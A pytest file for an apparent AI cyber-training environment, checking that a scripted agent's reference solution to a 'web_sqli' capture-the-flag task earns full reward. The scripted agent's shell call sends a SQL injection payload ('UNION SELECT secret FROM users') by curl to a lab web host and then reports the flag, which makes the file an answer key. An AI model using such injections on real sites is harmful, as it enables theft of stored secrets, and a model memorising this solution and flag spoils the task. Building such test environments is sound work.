import json
from pathlib import Path
import pytest
from cyberl import rollout, get_task
from cyberl.task import discover
from cyberl.models import ScriptedModel

pytestmark = pytest.mark.docker

INJECT = "http://web:8000/?name=' UNION SELECT secret FROM users--"

def test_reference_solution_scores_one():
    discover(Path(__file__).resolve().parent.parent)   # register tasks/ under unique module names
    model = ScriptedModel([
        {"role": "assistant", "content": None,
         "tool_calls": [{"id": "1", "type": "function",
                         "function": {"name": "shell",
                                      "arguments": json.dumps(
                                          {"command": f"curl -s \"{INJECT}\""})}}]},
        {"role": "assistant", "content": "The secret is CTF{sqli_master}",
         "tool_calls": None},
    ])
    r = rollout(get_task("web_sqli"), model)
    assert r.reward == 1.0
